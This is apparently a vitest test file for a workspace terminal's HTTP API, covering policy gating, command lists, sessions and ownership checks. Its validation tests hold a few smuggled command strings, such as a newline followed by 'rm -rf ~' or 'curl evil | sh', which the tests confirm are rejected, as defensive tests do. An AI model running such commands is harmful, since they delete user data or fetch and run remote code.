import { existsSync, mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { RunStore } from '../runs/store.ts';
import type { RunManager } from '../workflows/run.ts';
import { createApp, type ServerDeps } from './server.ts';
import { apiRequest } from './loopback-request.testkit.ts';
import type { PtyBinding, PtyProcess, PtySpawnOptions } from './terminal/pty-module.ts';
import { TerminalSessions } from './terminal/sessions.ts';
import { configuredCommands } from '../terminal-commands.ts';
import { mergeWriteWorkspaceConfig } from '../workspace/config.ts';

/**
 * The workspace terminal's HTTP surface (spec `.ai/specs/2026-10-07-task-workspace.md` §6).
 *
 * Every case drives a FAKE pty through the injected registry: a suite that forked real shells
 * would leave processes behind on a CI box, and the shell is not what these assertions are
 * about — the policy gate, the run/session ownership check, and the cursor contract are.
 */

class FakePty implements PtyProcess {
  readonly pid = 777;
  written: string[] = [];
  resized: Array<[number, number]> = [];
  killed = 0;
  private data?: (chunk: string) => void;
  onData(listener: (chunk: string) => void) { this.data = listener; return { dispose: () => {} }; }
  onExit() { return { dispose: () => {} }; }
  write(data: string) { this.written.push(data); }
  resize(cols: number, rows: number) { this.resized.push([cols, rows]); }
  kill() { this.killed += 1; }
  emit(chunk: string) { this.data?.(chunk); }
}

describe('the workspace terminal routes', () => {
  let repoRoot: string;
  let worktree: string;
  let store: RunStore;
  let sessions: TerminalSessions;
  let ptys: FakePty[];
  let spawned: PtySpawnOptions[];
  const savedRemote = process.env.CEZ_REMOTE;
  const savedTerminal = process.env.CEZ_TERMINAL;
  const savedDryRun = process.env.CEZ_DRY_RUN;

  beforeEach(() => {
    repoRoot = mkdtempSync(join(tmpdir(), 'cez-terminal-'));
    worktree = join(repoRoot, 'wt');
    mkdirSync(worktree, { recursive: true });
    store = RunStore.open(join(repoRoot, '.ai/cezar'));
    delete process.env.CEZ_REMOTE;
    delete process.env.CEZ_TERMINAL;
    process.env.CEZ_DRY_RUN = '1';
    ptys = [];
    spawned = [];
    const binding = async (): Promise<PtyBinding> => ({
      available: true,
      module: {
        spawn: (_file: string, _args: string[], options: PtySpawnOptions) => {
          spawned.push(options);
          const pty = new FakePty();
          ptys.push(pty);
          return pty;
        },
      },
    });
    sessions = new TerminalSessions(binding);
  });

  afterEach(() => {
    sessions.dispose();
    store.flush();
    rmSync(repoRoot, { recursive: true, force: true });
    for (const [key, saved] of [
      ['CEZ_REMOTE', savedRemote],
      ['CEZ_TERMINAL', savedTerminal],
      ['CEZ_DRY_RUN', savedDryRun],
    ] as const) {
      if (saved === undefined) delete process.env[key];
      else process.env[key] = saved;
    }
  });

  const makeApp = (over: Partial<ServerDeps> = {}) =>
    createApp({
      repoRoot,
      store,
      manager: {} as RunManager,
      version: '0.0.0-test',
      terminalSessions: sessions,
      ...over,
    });

  /** A run with a worktree the terminal is allowed to open. */
  const seedRun = (over: Record<string, unknown> = {}) => {
    const run = store.createRun({ title: 't', workflow: 'quick-task', task: 'do a thing', steps: [] });
    store.updateRun(run.id, { worktreePath: worktree, ...over } as never);
    return run.id;
  };

  const openSession = async (runId: string) => {
    const res = await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ cols: 90, rows: 20 }),
    });
    expect(res.status).toBe(201);
    return (await res.json()) as { id: string; topic: string; cwd: string; exitCode: number | null };
  };

  describe('the policy gate', () => {
    it('reports the terminal available on a local cockpit', async () => {
      const runId = seedRun();
      const res = await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal`);
      expect(res.status).toBe(200);
      expect(await res.json()).toMatchObject({ available: true, sessions: [] });
    });

    it('refuses on a hosted cockpit, with a reason rather than a code', async () => {
      process.env.CEZ_REMOTE = '1';
      const runId = seedRun();
      const state = await (await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal`)).json();
      expect(state).toMatchObject({ available: false, sessions: [] });
      expect((state as { reason: string }).reason).toContain('CEZ_TERMINAL=1');

      const created = await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: '{}',
      });
      expect(created.status).toBe(409);
    });

    it('opens on a hosted cockpit only when CEZ_TERMINAL=1 says so', async () => {
      process.env.CEZ_REMOTE = '1';
      process.env.CEZ_TERMINAL = '1';
      const runId = seedRun();
      const session = await openSession(runId);
      expect(session.cwd).toBe(worktree);
    });

    it('CEZ_TERMINAL=0 turns it off locally too', async () => {
      process.env.CEZ_TERMINAL = '0';
      const runId = seedRun();
      const state = await (await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal`)).json();
      expect(state).toMatchObject({ available: false });
    });
  });

  describe('the start recipe', () => {
    const put = (body: unknown) =>
      apiRequest(makeApp(), '/api/v1/start-app', {
        method: 'PUT',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify(body),
      });

    it('saves the team recipe in the repo config and hands it to the task as the one in force', async () => {
      const res = await put({ scope: 'project', recipe: { services: ['npm run dev'], url: 'http://localhost:5173' } });
      expect(res.status).toBe(200);
      expect(await res.json()).toMatchObject({ project: { services: ['npm run dev'] } });
      const runId = seedRun();
      const commands = await (await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal/commands`)).json();
      expect(commands).toMatchObject({ recipe: { services: ['npm run dev'], url: 'http://localhost:5173', scope: 'project' } });
    });

    it("installs nothing itself where the project's own setup scripts prepare the worktree (#1495)", async () => {
      writeFileSync(join(worktree, 'package.json'), '{}');
      writeFileSync(join(worktree, 'package-lock.json'), '{}');
      const runId = seedRun();
      const before = await (await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal/commands`)).json();
      expect(before).toMatchObject({ install: 'npm ci' });

      mkdirSync(join(repoRoot, '.ai/cezar'), { recursive: true });
      writeFileSync(
        join(repoRoot, '.ai/cezar/config.json'),
        JSON.stringify({
          worktreeLifecycle: {
            afterCreate: [{ id: '0d7c3c1e-6f2a-4b8e-9d1a-2f4c5b6a7e8f', command: 'npm ci' }],
            beforeRemove: [],
          },
        }),
      );
      const after = await (await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal/commands`)).json();
      expect(after).not.toHaveProperty('install');
    });

    it('rejects a recipe with no services or a non-http address at the boundary', async () => {
      expect((await put({ scope: 'project', recipe: { services: [] } })).status).toBe(400);
      expect((await put({ scope: 'project', recipe: { services: ['x'], url: 'ftp://x' } })).status).toBe(400);
    });

    it('refuses to store a command where the terminal is off', async () => {
      process.env.CEZ_TERMINAL = '0';
      expect((await put({ scope: 'project', recipe: { services: ['npm run dev'] } })).status).toBe(409);
    });
  });

  describe('defined terminal commands (#1555)', () => {
    const put = (body: unknown) =>
      apiRequest(makeApp(), '/api/v1/terminal-commands', {
        method: 'PUT',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify(body),
      });

    it('stores the team list in the repo config and offers it to the task beside the detected ones', async () => {
      writeFileSync(join(worktree, 'package.json'), JSON.stringify({ scripts: { dev: 'vite' } }));
      const res = await put({ scope: 'project', commands: [{ name: 'Tests', command: 'pnpm test' }] });
      expect(res.status).toBe(200);
      expect(await res.json()).toMatchObject({ project: [{ name: 'Tests', command: 'pnpm test' }], personal: [] });
      const runId = seedRun();
      const body = (await (await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal/commands`)).json()) as {
        configured?: unknown;
        commands: unknown;
      };
      expect(body.configured).toEqual([{ name: 'Tests', command: 'pnpm test', scope: 'project' }]);
      expect(body.commands).toMatchObject([{ command: 'npm run dev', source: 'package.json' }]);
    });

    it('answers no `configured` key when nothing is defined (zero config)', async () => {
      const runId = seedRun();
      const body = await (await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal/commands`)).json();
      expect(body).not.toHaveProperty('configured');
    });

    it('removes the key when the list is emptied', async () => {
      await put({ scope: 'project', commands: [{ name: 'a', command: 'b' }] });
      const res = await put({ scope: 'project', commands: [] });
      expect(await res.json()).toMatchObject({ project: [] });
    });

    it('rejects an empty name, an empty command and an oversized list at the boundary', async () => {
      expect((await put({ scope: 'project', commands: [{ name: ' ', command: 'x' }] })).status).toBe(400);
      expect((await put({ scope: 'project', commands: [{ name: 'x', command: '' }] })).status).toBe(400);
      const many = Array.from({ length: 31 }, (_, i) => ({ name: `n${i}`, command: `c${i}` }));
      expect((await put({ scope: 'project', commands: many })).status).toBe(400);
    });

    it('refuses to store a command where the terminal is off', async () => {
      process.env.CEZ_TERMINAL = '0';
      expect((await put({ scope: 'project', commands: [{ name: 'a', command: 'b' }] })).status).toBe(409);
    });

    describe('with this project in your project list', () => {
      beforeEach(async () => {
        await mergeWriteWorkspaceConfig((config) => {
          config.projects = [{ id: 'demo', root: repoRoot, name: 'demo', addedAt: '', lastOpenedAt: '', source: 'local' }];
        });
      });
      afterEach(async () => {
        await mergeWriteWorkspaceConfig((config) => {
          config.projects = [];
        });
      });

      it('stores your own list in your registry entry, not in the repo config', async () => {
        const res = await put({ scope: 'personal', commands: [{ name: 'Mine', command: 'make mine' }] });
        expect(res.status).toBe(200);
        expect(await res.json()).toEqual({
          project: [],
          personal: [{ name: 'Mine', command: 'make mine' }],
          personalAvailable: true,
        });
        expect(existsSync(join(repoRoot, '.ai/cezar/config.json'))
          ? JSON.parse(readFileSync(join(repoRoot, '.ai/cezar/config.json'), 'utf8'))
          : {}).not.toHaveProperty('terminalCommands');
      });

      it('offers yours first, then the repo config\'s, and a command line both define once, as yours', async () => {
        await put({
          scope: 'project',
          commands: [{ name: 'Team tests', command: 'pnpm test' }, { name: 'Lint', command: 'pnpm lint' }],
        });
        await put({ scope: 'personal', commands: [{ name: 'My tests', command: 'pnpm test' }] });
        const runId = seedRun();
        const body = (await (await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal/commands`)).json()) as {
          configured?: unknown;
        };
        expect(body.configured).toEqual([
          { name: 'My tests', command: 'pnpm test', scope: 'personal' },
          { name: 'Lint', command: 'pnpm lint', scope: 'project' },
        ]);
      });

      it('offers the same defined commands to the project terminal (#1526)', async () => {
        writeFileSync(join(repoRoot, 'package.json'), JSON.stringify({ scripts: { dev: 'vite' } }));
        await put({ scope: 'project', commands: [{ name: 'Team', command: 'make team' }] });
        await put({ scope: 'personal', commands: [{ name: 'Mine', command: 'make mine' }] });
        const body = (await (await apiRequest(makeApp(), '/api/v1/terminal/commands')).json()) as {
          configured?: unknown;
          commands: unknown;
        };
        expect(body.configured).toEqual([
          { name: 'Mine', command: 'make mine', scope: 'personal' },
          { name: 'Team', command: 'make team', scope: 'project' },
        ]);
        expect(body.commands).toMatchObject([{ command: 'npm run dev', source: 'package.json' }]);
      });
    });

    it('refuses your own list, 409, for a project that is not in your project list', async () => {
      await mergeWriteWorkspaceConfig((config) => {
        config.projects = [];
      });
      const res = await put({ scope: 'personal', commands: [{ name: 'Mine', command: 'make mine' }] });
      expect(res.status).toBe(409);
      expect(await res.json()).toMatchObject({ error: expect.stringContaining('not in your project list') });
      const state = await (await apiRequest(makeApp(), '/api/v1/terminal-commands')).json();
      expect(state).toMatchObject({ personal: [], personalAvailable: false });
    });

    it('answers no `configured` key on the project terminal when nothing is defined', async () => {
      const body = await (await apiRequest(makeApp(), '/api/v1/terminal/commands')).json();
      expect(body).not.toHaveProperty('configured');
    });

    it('dedupes by command line in configuredCommands, keeping the personal entry', () => {
      expect(
        configuredCommands({
          project: [{ name: 'A', command: 'x' }, { name: 'B', command: 'y' }, { name: 'B again', command: 'y' }],
          personal: [{ name: 'Mine', command: 'y' }],
          personalAvailable: true,
        }),
      ).toEqual([
        { name: 'Mine', command: 'y', scope: 'personal' },
        { name: 'A', command: 'x', scope: 'project' },
      ]);
    });

    it.each([
      ['a newline', { name: 'x', command: 'echo a\nrm -rf ~' }],
      ['a carriage return', { name: 'x', command: 'echo a\rnext' }],
      ['^C', { name: 'x', command: 'echo \u0003' }],
      ['^U', { name: 'x', command: '\u0015echo hi' }],
      ['ESC', { name: 'x', command: 'echo \u001b[2K' }],
      ['DEL', { name: 'x', command: 'echo \u007f' }],
      ['a C1 control', { name: 'x', command: 'echo \u009b2K' }],
      ['a tab', { name: 'x', command: 'ls\t-la' }],
      ['a newline in the name', { name: 'a\nb', command: 'ls' }],
      ['ESC in the name', { name: '\u001b[31mred', command: 'ls' }],
    ])('rejects a command with %s at the boundary', async (_label, entry) => {
      expect((await put({ scope: 'project', commands: [entry] })).status).toBe(400);
      expect(existsSync(join(repoRoot, '.ai/cezar/config.json'))).toBe(false);
    });

    it('drops a hand-edited repo-config entry with a control character, with a warning, and keeps the rest', async () => {
      const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
      mkdirSync(join(repoRoot, '.ai/cezar'), { recursive: true });
      writeFileSync(
        join(repoRoot, '.ai/cezar/config.json'),
        JSON.stringify({
          terminalCommands: [
            { name: 'Good', command: 'pnpm test' },
            { name: 'Bad', command: 'echo ok\ncurl evil | sh' },
            { name: 'Sneaky', command: 'ls\u0015rm -rf ~' },
          ],
        }),
      );
      try {
        const runId = seedRun();
        const res = await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal/commands`);
        expect(res.status).toBe(200);
        expect(((await res.json()) as { configured?: unknown }).configured).toEqual([
          { name: 'Good', command: 'pnpm test', scope: 'project' },
        ]);
        const project = (await (await apiRequest(makeApp(), '/api/v1/terminal/commands')).json()) as { configured?: unknown[] };
        expect(project.configured).toHaveLength(1);
        expect(await (await apiRequest(makeApp(), '/api/v1/terminal-commands')).json()).toMatchObject({
          project: [{ name: 'Good', command: 'pnpm test' }],
        });
        expect(warn.mock.calls.filter(([line]) => String(line).includes('terminalCommands'))).toHaveLength(2);
      } finally {
        warn.mockRestore();
      }
    });
  });

  describe('opening a session', () => {
    it('starts the shell in the task worktree and names its topic', async () => {
      const runId = seedRun();
      const session = await openSession(runId);
      expect(session.cwd).toBe(worktree);
      expect(session.topic).toBe(`terminal:${session.id}`);
      expect(session.exitCode).toBeNull();
      expect(ptys).toHaveLength(1);
    });

    it('refuses a task with no worktree rather than falling back to the boot repo', async () => {
      const runId = seedRun({ worktreePath: undefined });
      const res = await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: '{}',
      });
      // Spec §3.3: a panel must never silently show the boot repo instead of the task's tree.
      expect(res.status).toBe(409);
      expect((await res.json() as { error: string }).error).toContain('no worktree');
      expect(ptys).toHaveLength(0);
    });

    it('opens a worktree-off task in the repo checkout it ran in', async () => {
      // Not the fallback the case above refuses: this task never had a worktree, so the repo
      // working tree IS its tree — the same answer its Changes and Commits views read.
      const runId = seedRun({ worktreePath: undefined, worktree: false });
      const session = await openSession(runId);
      expect(session.cwd).toBe(repoRoot);
      expect(ptys).toHaveLength(1);
    });

    it('discovers a worktree-off task’s commands in the repo checkout', async () => {
      writeFileSync(join(repoRoot, 'package.json'), JSON.stringify({ scripts: { dev: 'vite' } }));
      const off = seedRun({ worktreePath: undefined, worktree: false });
      const found = await (await apiRequest(makeApp(), `/api/v1/runs/${off}/terminal/commands`)).json();
      expect(JSON.stringify(found)).toContain('dev');

      // A task that merely lost its worktree is still offered nothing from the boot repo.
      const reclaimed = seedRun({ worktreePath: undefined });
      const none = await (await apiRequest(makeApp(), `/api/v1/runs/${reclaimed}/terminal/commands`)).json();
      expect(none).toEqual({ commands: [] });
    });

    it('404s for a task that does not exist', async () => {
      const res = await apiRequest(makeApp(), '/api/v1/runs/nope/terminal', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: '{}',
      });
      expect(res.status).toBe(404);
    });

    it('lists only this task’s sessions', async () => {
      const mine = seedRun();
      const other = seedRun();
      const session = await openSession(mine);
      await openSession(other);

      const state = await (await apiRequest(makeApp(), `/api/v1/runs/${mine}/terminal`)).json();
      expect((state as { sessions: Array<{ id: string }> }).sessions.map((s) => s.id)).toEqual([session.id]);
    });
  });

  describe('output', () => {
    it('replays from cursor 0 and advances', async () => {
      const runId = seedRun();
      const session = await openSession(runId);
      ptys[0]!.emit('compiling…');

      const first = await (await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal/${session.id}/output`)).json();
      expect(first).toMatchObject({ data: 'compiling…', truncated: false, exitCode: null });

      ptys[0]!.emit(' done');
      const cursor = (first as { cursor: number }).cursor;
      const next = await (await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal/${session.id}/output?cursor=${cursor}`)).json();
      expect(next).toMatchObject({ data: ' done' });
    });

    it('is never cached — a terminal read must not come from a proxy', async () => {
      const runId = seedRun();
      const session = await openSession(runId);
      const res = await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal/${session.id}/output`);
      expect(res.headers.get('cache-control')).toBe('no-store');
    });
  });

  describe('input, resize and stop', () => {
    it('forwards keystrokes', async () => {
      const runId = seedRun();
      const session = await openSession(runId);
      const res = await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal/${session.id}/input`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ data: 'npm test\r' }),
      });
      expect(res.status).toBe(200);
      expect(ptys[0]!.written).toEqual(['npm test\r']);
    });

    it('rejects an oversized paste at the boundary, not in the shell', async () => {
      const runId = seedRun();
      const session = await openSession(runId);
      const res = await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal/${session.id}/input`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ data: 'x'.repeat(70_000) }),
      });
      expect(res.status).toBe(400);
      expect(ptys[0]!.written).toEqual([]);
    });

    it('propagates a resize', async () => {
      const runId = seedRun();
      const session = await openSession(runId);
      await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal/${session.id}/resize`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ cols: 120, rows: 40 }),
      });
      expect(ptys[0]!.resized).toEqual([[120, 40]]);
    });

    it('stops a session', async () => {
      const runId = seedRun();
      const session = await openSession(runId);
      const kill = vi.spyOn(process, 'kill').mockImplementation(() => true);
      try {
        const res = await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal/${session.id}`, { method: 'DELETE' });
        expect(res.status).toBe(200);
        if (process.platform === 'win32') {
          // No process groups on Windows: the binding's own kill is the documented path there.
          expect(kill).not.toHaveBeenCalled();
          expect(ptys[0]!.killed).toBe(1);
          return;
        }
        // The whole process group, so what the shell started dies with it.
        expect(kill).toHaveBeenCalledWith(-777, 'SIGHUP');
      } finally {
        kill.mockRestore();
      }
    });
  });

  describe('ownership', () => {
    it('refuses to drive another task’s session through this task’s url', async () => {
      const mine = seedRun();
      const other = seedRun();
      const session = await openSession(other);

      for (const [path, init] of [
        [`/api/v1/runs/${mine}/terminal/${session.id}/output`, undefined],
        [`/api/v1/runs/${mine}/terminal/${session.id}/input`, {
          method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ data: 'x' }),
        }],
        [`/api/v1/runs/${mine}/terminal/${session.id}`, { method: 'DELETE' }],
      ] as const) {
        const res = await apiRequest(makeApp(), path, init as RequestInit | undefined);
        expect(res.status).toBe(404);
      }
      expect(ptys[0]!.written).toEqual([]);
    });

    it('404s an unknown session id', async () => {
      const runId = seedRun();
      const res = await apiRequest(makeApp(), `/api/v1/runs/${runId}/terminal/made-up/output`);
      expect(res.status).toBe(404);
    });
  });
});
